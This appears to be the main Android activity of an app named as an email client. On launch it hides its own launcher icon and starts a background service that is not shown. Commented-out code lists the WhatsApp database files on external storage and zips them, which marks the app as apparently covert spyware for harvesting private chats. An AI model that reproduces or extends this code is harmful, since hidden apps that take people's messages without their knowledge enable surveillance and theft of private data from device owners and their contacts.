package purvil12c.email0;

import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.Contacts;
import android.provider.ContactsContract;
import android.widget.Toast;

public class MainActivity extends Activity {

   // static int BUFFER_SIZE = 100000;

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //To hide the app from launcher, Remove comments from below code lines!

        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, purvil12c.email0.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

       // final Button send = (Button) this.findViewById(R.id.send);


//        int i=0;
//        String x="";
//        File yourDir = new File(Environment.getExternalStorageDirectory().getPath() + "/WhatsApp/Databases");
//        for (File f : yourDir.listFiles()) {
//            if (f.isFile())
//              x = x + "\n" +f.getName();
//                //name[i] = f.getName();
//                ++i;
//        }
//        int length = i;
//        i=0;
//        String name[] = new String[length];
//        for (File f : yourDir.listFiles()) {
//            if (f.isFile())
//                name[i] = Environment.getExternalStorageDirectory().getPath() + "/WhatsApp/Databases/"+f.getName();
//                ++i;
//        }
//
//        try{
//          //  zip(name,Environment.getExternalStorageDirectory().getPath() + "/WhatsApp/Databases/k.zip");
//        }
//        catch (Exception e){
//            e.printStackTrace();
//        }
//        Toast.makeText(this,x,Toast.LENGTH_LONG).show();



        Intent intent = new Intent(this,Background.class);
        startService(intent);


    }


    //code to zip a file.

//    public void zip(String[] files, String zipFile)
//    {
//         String[] _files= files;
//         String _zipFile= zipFile;
//
//        try  {
//            BufferedInputStream origin = null;
//            FileOutputStream dest = new FileOutputStream(_zipFile);
//
//            ZipOutputStream out = new ZipOutputStream(new BufferedOutputStream(dest));
//
//            byte data[] = new byte[BUFFER_SIZE];
//
//            for(int i=1; i < _files.length; i++) {
//                Log.d("add:",_files[i]);
//                Log.v("Compress", "Adding: " + _files[i]);
//                FileInputStream fi = new FileInputStream(_files[i]);
//                origin = new BufferedInputStream(fi, BUFFER_SIZE);
//                ZipEntry entry = new ZipEntry(_files[i].substring(_files[i].lastIndexOf("/") + 1));
//                out.putNextEntry(entry);
//                int count;
//                while ((count = origin.read(data, 0, BUFFER_SIZE)) != -1) {
//                    out.write(data, 0, count);
//                }
//                origin.close();
//            }
//
//            out.close();
//        } catch(Exception e) {
//            e.printStackTrace();
//        }
//
//    }


}